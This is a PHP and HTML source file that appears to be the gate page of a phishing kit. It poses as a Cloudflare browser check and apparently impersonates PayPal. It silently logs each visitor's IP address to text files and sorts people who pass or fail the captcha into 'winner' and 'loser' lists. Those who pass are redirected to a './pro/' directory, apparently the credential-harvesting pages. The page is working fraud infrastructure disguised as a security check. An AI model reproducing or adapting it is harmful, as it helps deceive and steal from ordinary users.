<?php

$ip = getenv("REMOTE_ADDR");
$url="http://whoer.net/check?host=".$ip;
$file = fopen("robots.txt","a");
fwrite($file,$url."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

session_start();

$_GLOBAL_MSG = '';

if (isset($_POST['form_submit']) && $_POST['form_submit'] == '1') {
	if (!validCaptcha('frm_sample')) {
		$ip = getenv("REMOTE_ADDR");
$url="http://whoer.net/check?host=".$ip;
$file = fopen("loser.txt","a");
fwrite($file,$url."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
	} else {
		$ip = getenv("REMOTE_ADDR");
$url="http://whoer.net/check?host=".$ip;
$file = fopen("winner.txt","a");
fwrite($file,$url."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
		header("Location: ./pro/");
die();
	}
}

if (isset($_REQUEST['css_type']) && $_REQUEST['css_type'] == '1') {
	$_FORM_TYPE = 1;//-- Vertical
} else {
	$_FORM_TYPE = 0;//-- Horizontal
}

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <link href="./images/fav.ico" rel="shortcut icon" type="image/x-icon">
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

  <title>Just a moment...</title>
	<meta name="keywords" content="visualcaptcha, visual, jquery captcha, captcha, mobile-friendly, better captcha, fancy captcha, captcha alternative, jquery, jquery ui, drag, draggable, demo, retina, accessibility">
	<meta name="description" content="A cool visual drag-and-drop captcha jQuery plugin. Mobile-friendly. Retina-ready. Accessible.">
	<meta name="author" content="emotionLoop">

	<meta name="viewport" content="width=device-width,initial-scale=1">

	<script src="js/jquery.min.js"></script>
	<script src="js/jquery-ui.min.js"></script>
	
	<link rel="stylesheet" href="sample.css" media="all" />
	<link rel="stylesheet" href="b.css" media="all" />
</head>
<style>
.content {
    max-width: 500px;
    margin: auto;
}
</style>



<body>
	<div class="content">
	<div id="wrapper" class="type-<?php echo $_FORM_TYPE; ?>">
		<div id="content">

  <style type="text/css">
    h1 {font-size: 1.5em; color: #404040; text-align: center;}
    p {font-size: 1em; color: #404040; text-align: center; margin: 10px 0 0 0;}
    #spinner {margin: 0 auto 30px auto; display: block;}
    .attribution {margin-top: 20px;}
    @-webkit-keyframes bubbles { 33%: { -webkit-transform: translateY(10px); transform: translateY(10px); } 66% { -webkit-transform: translateY(-10px); transform: translateY(-10px); } 100% { -webkit-transform: translateY(0); transform: translateY(0); } }
    @keyframes bubbles { 33%: { -webkit-transform: translateY(10px); transform: translateY(10px); } 66% { -webkit-transform: translateY(-10px); transform: translateY(-10px); } 100% { -webkit-transform: translateY(0); transform: translateY(0); } }
    .bubbles { background-color: #179bd7; width:15px; height: 15px; margin:2px; border-radius:100%; -webkit-animation:bubbles 0.6s 0.07s infinite ease-in-out; animation:bubbles 0.6s 0.07s infinite ease-in-out; -webkit-animation-fill-mode:both; animation-fill-mode:both; display:inline-block; }
  </style>

<script type="text/javascript">
  //<![CDATA[
  (function(){
    var a = function() {try{return !!window.addEventListener} catch(e) {return !1} },
    b = function(b, c) {a() ? document.addEventListener("DOMContentLoaded", b, c) : document.attachEvent("onreadystatechange", b)};
    b(function(){
      var a = document.getElementById('cf-content');a.style.display = 'block';
      setTimeout(function(){
        var s,t,o,p,b,r,e,a,k,i,n,g,f, alOguXs={"wsSqNRrXPvF":+((!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]))};
        t = document.createElement('div');
        t.innerHTML="<a href='/'>x</a>";
        t = t.firstChild.href;r = t.match(/https?:\/\//)[0];
        t = t.substr(r.length); t = t.substr(0,t.length-1);
        a = document.getElementById('jschl-answer');
        f = document.getElementById('challenge-form');
        ;alOguXs.wsSqNRrXPvF*=+((!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]));alOguXs.wsSqNRrXPvF*=+((!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]));alOguXs.wsSqNRrXPvF*=+((!+[]+!![]+!![]+!![]+[])+(!+[]+!![]));alOguXs.wsSqNRrXPvF+=+((!+[]+!![]+!![]+[])+(!+[]+!![]));alOguXs.wsSqNRrXPvF*=+!![];a.value = parseInt(alOguXs.wsSqNRrXPvF, 10) + t.length; '; 121'
        f.action += location.hash;
        f.submit();
      }, 4000);
    }, false);
  })();
  //]]>
</script>
<table width="100%" height="100%" cellpadding="20">
    <tr>
      <td align="center" valign="middle">
          <div class="cf-browser-verification cf-im-under-attack">
  <div id="cf-content" style="display:none">
    <img src="./images/pp-logo-151px.png"
 alt=""><br><br><br>

    <div>
      <div class="bubbles"></div>
      <div class="bubbles"></div>
      <div class="bubbles"></div>
    </div>

	
	 
  
  </div>
   
</div>


      </td>
     
    </tr>
  </table>
<div id="footer">
			<p><a target="_blank">Checking your browser before accessing.</a> <br /> </p>
		</div>
			<p><br />This is an automatic process.<br> Please, you need to complete the captcha in order to continue!</p>
			
	<br>		
<head>
    	<link rel="stylesheet" href="js/jq.css">
		<script type="text/javascript" src="signin.js"></script> 
	</head>
<body onLoad="ChangeCaptcha()"> 
	       <p><input type="text"   id="randomfield" disabled></p>
		<p><input placeholder="Enter the code" id="CaptchaEnter" size="20" maxlength="6" /></p>
		<br>
	      <p><button onclick="check()" class="submit" type="submit" name="submit" value="">Continue</button></p>			
				<br><br>
				<p><small>Verification System by <a href="?css_type=0">©1999-2019 , Inc. All rights reserved.</small></p>
			</form>
		</div>
	</div>
	</div>
</body>
</html>
<?php

//-- These functions aren't needed, but we recommend you to use them (or similar), so you can start/get multiple captcha instances with two simple functions.

function printCaptcha($formId = NULL, $type = NULL, $fieldName = NULL, $accessibilityFieldName = NULL) {
	require_once('inc/visualcaptcha.class.php');
	
	$visualCaptcha = new \visualCaptcha\captcha($formId,$type,$fieldName,$accessibilityFieldName);
	$visualCaptcha->show();
}

function validCaptcha($formId = NULL, $type = NULL, $fieldName = NULL, $accessibilityFieldName = NULL) {
	require_once('inc/visualcaptcha.class.php');
	
	$visualCaptcha = new \visualCaptcha\captcha($formId,$type,$fieldName,$accessibilityFieldName);
	return $visualCaptcha->isValid();
}

?>
